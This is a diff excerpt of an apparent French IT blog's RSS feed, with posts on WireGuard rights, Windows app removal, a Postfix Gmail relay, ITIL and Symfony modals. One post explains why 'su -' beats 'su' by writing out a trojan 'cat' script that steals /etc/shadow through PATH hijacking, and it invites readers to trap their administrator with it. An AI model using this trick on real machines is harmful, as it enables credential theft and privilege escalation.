+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;LimitedOperatorUI&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;et lui attribuer la valeur 1.&lt;/p&gt;
+&lt;p&gt;Si vous voulez le configurer à l'aide d'une GPO, voici la configuration:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="GPO clé de registre wireguard" src="/images/gpo1-Wireguard.png"&gt;&lt;/p&gt;
+&lt;h1&gt;Donner des droits à l'utilisateur&lt;/h1&gt;
+&lt;p&gt;L'utilisateur doit faire partie du groupe local "Opérateurs de configuration réseau".&lt;/p&gt;
+&lt;p&gt;Dans le cadre d'un fonctionnement avec l'active directory, vous pouvez utiliser les groupes restreints: L'idée est de créer un groupe dans votre AD qu'on pourrait par exemple appeler "utilisateurs Wireguard" et faire en sorte que ce groupe soit membre du groupe local des PC clients "Opérateurs de configuration réseau".&lt;/p&gt;
+&lt;p&gt;Vous pouvez regarder ce tuto sur l'excellent site &lt;a href="https://www.it-connect.fr/gpo-definir-un-utilisateur-administrateur-local-de-tous-les-pcs/"&gt;It Connect&lt;/a&gt; &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Sun, 18 Apr 2021 19:32:33 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2021-04-18:/autoriser-des-utilisateurs-non-admin-a-gerer-les-tunnels-wireguard.html</guid><category>Windows</category><category>[wireguard</category><category>windows</category><category>vpn]</category></item><item><title>"Supprimer les logiciels pré-installés avec Windows 10"</title><link>https://Coubiac.github.io/supprimer-les-logiciels-pre-installes-avec-windows-10.html</link><description>&lt;p&gt;Quand on installe windows 10 pour la première fois, celui-ci installe tout un tas d'applications dont nous n'avons la plupart du temps pas besoin, surtout dans le cas d'une utilisation professionnelle.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Menu démarrer" src="/images/uninstall-windows-preinstall-packages/startmenu.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Lister les applications installées avec Powershell&lt;/h2&gt;
+&lt;p&gt;Powershell permet de désinstaller facilement une application. Pour cela il faut lancer powershell en mode administrateur.
+Une fois que vous vous trouver dans powershell, vous pouvez lister les packages installés à l'aide de la commande:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-AppxPackage&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;ft &lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PackageFullName&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="gatappxpackage" src="/images/uninstall-windows-preinstall-packages/gatappxpackage.png"&gt;&lt;/p&gt;
+&lt;p&gt;Si vous voulez la liste pour tous les utilisateurs:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-AppxPackage&lt;/span&gt; &lt;span class="n"&gt;-AllUsers&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;ft &lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PackageFullName&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Désinstaller une application&lt;/h2&gt;
+&lt;p&gt;Admettons que nous voulions désinstaller l'application Skype:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="skype" src="/images/uninstall-windows-preinstall-packages/skype.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous allons la désinstaller à l'aide de cette commande:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-AppxPackage&lt;/span&gt; &lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="n"&gt;skypeapp&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Remove-AppxPackage&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Désinstaller toutes les applications préinstallées&lt;/h2&gt;
+&lt;p&gt;Pour désinstaller l'ensemble des applications, il faut utiliser cette commande:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-AppxPackage&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-AllUsers&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Remove-AppxPackage&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="supprimer toutes les applications" src="/images/uninstall-windows-preinstall-packages/remove-all-packages.gif"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;NB: Quelques applications vont rester. Il vous faudra les désinstaller à la main...&lt;/strong&gt;&lt;/p&gt;
+&lt;h2&gt;Desactiver la reinstallation pour les nouveaux utilisateurs&lt;/h2&gt;
+&lt;p&gt;Quand les applications ont été supprimées, on peut empecher la réinstallation pour les nouveaux utilisateurs:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-AppxProvisionedPackage&lt;/span&gt; &lt;span class="n"&gt;-online&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Remove-AppxProvisionedPackage&lt;/span&gt; &lt;span class="n"&gt;-online&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Wed, 11 Nov 2020 13:45:30 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2020-11-11:/supprimer-les-logiciels-pre-installes-avec-windows-10.html</guid><category>Windows</category><category>[it</category><category>Windows]</category></item><item><title>"Envoyer des mails de notification depuis un serveur Debian"</title><link>https://Coubiac.github.io/envoyer-des-mails-de-notification-depuis-un-serveur-debian.html</link><description>&lt;p&gt;Dans ce tuto nous allons installer postfix afin d'envoyer des mails depuis notre serveur DEBIAN 10.&lt;/p&gt;
+&lt;h1&gt;Installation de Postfix&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;On commence par mettre à jour le système et installer Postfix
+{% highlight bash %}
+~# apt-get update &amp;amp;&amp;amp; apt-get upgrade
+~# apt-get install libsasl2-modules postfix&lt;/p&gt;
+&lt;p&gt;Postfix va lancer l'assistant d'installation:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant1" src="/images/postfix/screen1.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ensuite postfix va vous demander de choisir un type d'installation. Vous allez choisir &lt;code&gt;site internet&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant2" src="/images/postfix/screen2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Entrez ensuite votre nom de domaine:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="assistant3" src="/images/postfix/screen3.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Création d'un mot de passe application pour GMAIL&lt;/h2&gt;
+&lt;p&gt;Si vous avez activé l'authentification à deux facteurs (2FA), vous devez créer un mot de passe Application.
+Vous pouvez consulter la documentation google à &lt;a href="https://support.google.com/mail/answer/185833?hl=fr"&gt;cette adresse&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Paramétrage de postfix&lt;/h2&gt;
+&lt;p&gt;il faut ensuite modifier le fichier &lt;code&gt;/etc/postfix/main.cf&lt;/code&gt; afin de modifier la valeur &lt;code&gt;myhostname&lt;/code&gt; avec notre nom d'hôte pleinement qualifié (fqdn)&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+myhostname = mail.exemple.fr&lt;/p&gt;
+&lt;p&gt;Nous allons maintenant ajouter le mot de passe du compte gmail (Attention, si vous avez activé l'authentification à deux facteurs de bien utilisé le mot de passe généré plus haut...). Nous allons pour cela modifier le fichier &lt;code&gt;/etc/postfix/sasl/sasl_passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+~# vi /etc/postfix/sasl/sasl_passwd&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;insérez ici l'authentification de cette manière (vous pouvez faire un copier-coller et remplacer le login/mdp avec les bonnes valeurs):
+{% highlight bash %}
+[smtp.gmail.com]:587 username@gmail.com:password&lt;/p&gt;
+&lt;p&gt;On peut maintenant utiliser la commande &lt;code&gt;postmap&lt;/code&gt;pour générer un fichier de bdd de hash:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+~# postmap /etc/postfix/sasl/sasl_passwd&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;Nous allons sécuriser un peu l'accès aux fichiers:
+{% highlight bash %}
+~# chown root:root /etc/postfix/sasl/sasl_passwd /etc/postfix/sasl/sasl_passwd.db 
+~# chmod 0600 /etc/postfix/sasl/sasl_passwd /etc/postfix/sasl/sasl_passwd.db&lt;/p&gt;
+&lt;h2&gt;Configurer le relay postfix&lt;/h2&gt;
+&lt;p&gt;Nous allons modifier le fichier &lt;code&gt;main.cf&lt;/code&gt; afin de relayer le courrier vers le smtp de gmail:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+~# vi /etc/postfix/main.cf&lt;/p&gt;
+&lt;p&gt;On modifie la valeur &lt;code&gt;relayhost&lt;/code&gt;:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+relayhost = [smtp.gmail.com]:587&lt;/p&gt;
+&lt;p&gt;Ensuite on ajoute ces lignes pour activer l'authentification:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+smtp_sasl_auth_enable = yes
+smtp_sasl_security_options = noanonymous
+smtp_sasl_password_maps = hash:/etc/postfix/sasl/sasl_passwd
+smtp_tls_security_level = encrypt
+smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt&lt;/p&gt;
+&lt;h2&gt;Configurer l'adresse mail de root&lt;/h2&gt;
+&lt;p _="%" endhighlight&gt;on edite le fichier &lt;code&gt;/etc/aliases&lt;/code&gt;
+{% highlight bash %}
+vi /etc/aliases&lt;/p&gt;
+&lt;p _="%" bash highlight&gt;le fichier doit ressembler à&lt;/p&gt;
+&lt;h1&gt;See man 5 aliases for format&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;postmaster: root
+root: username@domaine.com # On ajoute cette ligne avec l'adresse mail de l'admin du serveur&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;On compile les alias:
+{% highlight bash %}
+newaliases&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;on redémarre ensuite postfix
+{% highlight bash %}
+service postfix restart&lt;/p&gt;
+&lt;h2&gt;Test d'envoi de mail&lt;/h2&gt;
+&lt;p&gt;On peut utiliser sendmail pour tester l'envoi d'un mail (attention le point . à la fin est important):&lt;/p&gt;
+&lt;p&gt;{% highlight bash %}&lt;/p&gt;
+&lt;h1&gt;sendmail root&lt;/h1&gt;
+&lt;p _="%" endhighlight&gt;From: monserveur
+Subject: Mail test
+Ceci est un test
+.&lt;/p&gt;
+&lt;p&gt;Vous pouvez vérifier que tout s'est bien passé en consultant les logs:&lt;/p&gt;
+&lt;p _="%" endhighlight&gt;{% highlight bash %}
+tail -f /var/log/mail.log&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Mon, 02 Nov 2020 20:30:30 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2020-11-02:/envoyer-des-mails-de-notification-depuis-un-serveur-debian.html</guid><category>Linux</category><category>[linux</category><category>postfix</category><category>gmail]</category></item><item><title>"Itil: Différence entre Incident et Problème"</title><link>https://Coubiac.github.io/itil-difference-entre-incident-et-probleme.html</link><description>&lt;h1&gt;Incidents / Problème&lt;/h1&gt;
+&lt;h2&gt;Incidents&lt;/h2&gt;
+&lt;p&gt;Itil définit un incident comme étant: &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tout événement qui ne fait pas partie du fonctionnement standard d'un service et qui cause, ou peut causer, une interruption ou une diminution de la qualité de ce service&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;Exemple 1:&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Problématique:&lt;/strong&gt;
+Pierre vous contacte pour vous signaler qu'il n'arrive plus à imprimer car l'imprimante lui signale un bourrage papier. Il a pourtant retiré la feuille coincé dans l'imprimante.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Résolution:&lt;/strong&gt;
+Un technicien se déplace pour verifier que Pierre n'a pas déchiré la feuille coincé en la retirant et qu'un petit morceau de papier n'est pas resté coincé dans l'imprimante. Il remet l'imprimante en marche.&lt;/p&gt;
+&lt;h3&gt;Exemple 2:&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Problématique:&lt;/strong&gt;
+Jeanne de l'agence de Brest, vous appelle pour vous signaler que l'utilisation de l'ERP est extremment lente en ce moment et qu'elle n'arrive pas à travailler.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Contexte:&lt;/strong&gt;
+L'agence de Brest est un site distant, relié au site principal à l'aide d'un VPN. L'ERP fonctionne en mode Bureau à Distance (RDP)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Résolution:&lt;/strong&gt;
+Après enquète, vous vous rendez compte que la totalité de la bande passante est consommée par le téléchargement de mise à jour Windows. Vous demmandez à Jeanne de mettre les mises à jour en pause jusqu'a la pause déjeuner afin de rétablir une connexio&lt;/p&gt;
+&lt;h2&gt;Problèmes&lt;/h2&gt;
+&lt;p&gt;Itil définit un problème de cette manière:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Un problème est la cause inconnue d'un incident significatif ou de plusieurs incidents présentant les mêmes symptômes affectant le bon fonctionnement du système d'information ou du "métier" de l'entreprise.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;Exemple 1:&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Problématique:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Jacques vous signale le disfonctionnement de l'imprimante que Pierre quelques heure après le passage du technicien. Vous résolvez l'incident de la même manière mais le lendemain, c'est au tour de Marie de vous signaler un soucis similaire.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Résolution:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A chaque signalement, vous allez créer un ticket d'incident et essayer de faire en sorte que l'utilisateur puisse continuer à travailler. Cependant, compte tenu de la récurence des incidents vous allez créer un ticket de problème. Ce ticket sera attribué au technicien spécialisé dans la réparation des imprimantes. Il va résoudre le problème en remplaçant les rouleaux de prise de papier qui sont usés et qui provoquent des bourrages à répétition.&lt;/p&gt;
+&lt;p&gt;On voit bien dans cet exemple qu'on continue de traiter les incidents même si ceux-ci sont liés à un problème. Itil étant orienté business, le plus important est de dépanner le plus rapidement possible les utilisateurs.&lt;/p&gt;
+&lt;h3&gt;Exemple 2:&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Problématique:&lt;/strong&gt;
+Vous vous rendez compte en analysant les statistiques de votre système de ticketing, que l'incident signalé par Jeanne à l'agence de Brest est vraiment récurent: Plusieurs appels par mois à cause de problématiques similaires.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Résolution:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Vous allez créer un ticket de problème et attribuer ce ticket à l'administrateur réseau afin qu'il puisse mettre en place une priorisation des flux (QoS) pour prioriser les flux RDP (flux de communication de l'ERP).&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;La gestion des incidents s’occupe de résoudre les inconforts liés à une situation dégradée.
+La gestion des problèmes travaille pour s’assurer que les incidents ne se reproduiront pas.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Sun, 01 Nov 2020 13:45:30 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2020-11-01:/itil-difference-entre-incident-et-probleme.html</guid><category>SI</category><category>[itsm</category><category>itil]</category></item><item><title>"Pourquoi utiliser 'su -' plutôt que 'su'"</title><link>https://Coubiac.github.io/pourquoi-utiliser-su-plutot-que-su.html</link><description>&lt;p&gt;&lt;code&gt;su -&lt;/code&gt; invoque un shell de connexion après avoir changé d'utilisateur. Un shell de connexion réinitialise la plupart des variables d'environnement, fournissant une base propre.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;su&lt;/code&gt; ne fait que changer d'utilisateur, fournissant un shell normal avec un environnement presque identique à celui de l'ancien utilisateur.&lt;/p&gt;
+&lt;p&gt;Imaginez que vous êtes un développeur de logiciels avec un accès normal à une machine et que votre administrateur ignorant ne vous donne pas l'accès au compte root. Essayons (avec un peu de chance) de le piéger:&lt;/p&gt;
+&lt;p&gt;Vous connnaisser évidement la commande &lt;code&gt;cat&lt;/code&gt;qui permet d'afficher le contenu d'un fichier ? Nous allons la piéger en en créant une fausse:&lt;/p&gt;
+&lt;p&gt;Nous allons la stocker dans le dossier &lt;code&gt;tmp&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mkdir /tmp/evil_bin
+$ vi /tmp/evil_bin/cat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous créons donc un script que nous allons évidement appeler &lt;code&gt;cat&lt;/code&gt;
+Dans ce script, si l'utilisateur n'est pas root, le script simulera un message de permission refusée.
+Si l'utilisateur est root, le script va copier le contenu du fichier &lt;code&gt;/etc/shadow&lt;/code&gt; dans le dossier &lt;code&gt;tmp&lt;/code&gt; 
+Il va ensuite executer la commande &lt;code&gt;cat&lt;/code&gt; normalement.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class="nb"&gt;test&lt;/span&gt; &lt;span class="nv"&gt;$UID&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/bin/cat: Permission denied!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; 
+/bin/cat /etc/shadow &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&amp;gt;/tmp/shadow_copy
+/bin/cat &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$@&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous allons maintenent rendre le script executable et l'ajouter dans notre &lt;code&gt;PATH&lt;/code&gt; afin de pouvoir l'executer depuis n'importe quel dossier:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chmod +x /tmp/evil_bin/cat&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/evil_bin:&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Maintenant, allez voir votre administrateur pour lui demander pourquoi vous n'arrivez pas à afficher un fichier avec la commande &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Il va donc essayer en restant sur votre session mais ce ne sera pas le vrai programme &lt;code&gt;cat&lt;/code&gt;qui sera lancé mais notre petit script:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls -l /home/vous/mon-super-fichier
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; you wheel &lt;span class="m"&gt;41&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-06-28 &lt;span class="m"&gt;13&lt;/span&gt;:00 mon-super-fichier
+$ cat /home/vous/mon-super-fichier
+/bin/cat: Permission denied!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il va donc vouloir essayer avec les droits root en utilisant &lt;code&gt;su&lt;/code&gt;. Et c'est à ce moment qu'il va faire une erreur. En effet, comme il utilise &lt;code&gt;su&lt;/code&gt; au lieu de &lt;code&gt;su -&lt;/code&gt;, les variables d'environnement ne sont pas écrasées. Il va donc une nouvelle fois executer notre script au lieu d'executer la vrai commande &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ su
+Password: ...
+$ cat /home/vous/mon-super-fichier
+du contenu super important dans ce fichier.
+$ &lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il aura donc l'impression que tout a fonctionné et fermé la session root. Donc, vous pouvez maintenant dire "Merci monsieur l'admin" ^^ En effet, notre piège a fonctionné: &lt;/p&gt;
+&lt;p&gt;Nous avons bien récupéré une copie du fichier &lt;code&gt;/etc/shadow&lt;/code&gt;qui contient une liste de tous les comptes et les mots de passe chiffrés:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls -l /tmp/shadow_copy
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;1093&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-06-28 &lt;span class="m"&gt;13&lt;/span&gt;:02 /tmp/shadow_copy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il ne vous reste plus qu'a tenter de les déchiffrer... et pour ça, je vous laisse lire cet article de l'excellent &lt;a href="https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html"&gt;korben&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Sources: &lt;a href="https://stackoverflow.com"&gt;StackOverflow&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Fri, 30 Oct 2020 19:32:33 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2020-10-30:/pourquoi-utiliser-su-plutot-que-su.html</guid><category>Linux</category><category>[securite]</category></item><item><title>"Insérer un formulaire dans une modale avec Symfony et MaterializeCSS"</title><link>https://Coubiac.github.io/inserer-un-formulaire-dans-une-modale-avec-symfony-et-materializecss.html</link><description>&lt;p&gt;Quand on débute le développement Web, une des choses assez difficile à comprendre est le fonctionnement des fenêtres modales. Cette question m'a été posé plusieurs fois, c'est pour cette raison que j'ai décidé de faire un article.&lt;/p&gt;
+&lt;h2&gt;Principe de fonctionnement&lt;/h2&gt;
+&lt;p&gt;Principe de fonctionnement des fenêtres modales 
+&lt;img alt="fonctionnement modale" src="/images/modale.png"&gt;
+la fenêtre modale est déjà intégrée dans la page Web mais n'est simplement pas encore affichée. Voici un exemple de code html avec materializecss :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;&amp;lt;!-- Bouton servant à activer la modale --&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;waves-effect waves-light btn modal-trigger&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#modal1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Modal&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class="c"&gt;&amp;lt;!-- Structure de la modale --&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal-content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h4&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Modal Header&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h4&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+A bunch of text
+
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal-footer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal-close waves-effect waves-green btn-flat&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Agree&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On peut donc voir qu'une fenêtre modale est composée de deux parties: la structure et le lien permettant de l'activer.&lt;/p&gt;
+&lt;p&gt;Quand on clique sur le lien elle s'affiche mais est vide. Il faut donc à ce moment là effectuer un appel AJAX pour la remplir. (afficher le formulaire).&lt;/p&gt;
+&lt;h2&gt;Exemple avec Symfony&lt;/h2&gt;
+&lt;p&gt;Dans cet exemple, nous avons une entité « compétition » et une entité « inscrit » . Il y a une relation one to many: 1 compétition peut avoir plusieurs inscrits.&lt;/p&gt;
+&lt;p&gt;Voici la vue twig:&lt;/p&gt;
+&lt;p&gt;Le lien d'activation:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;{% raw %}
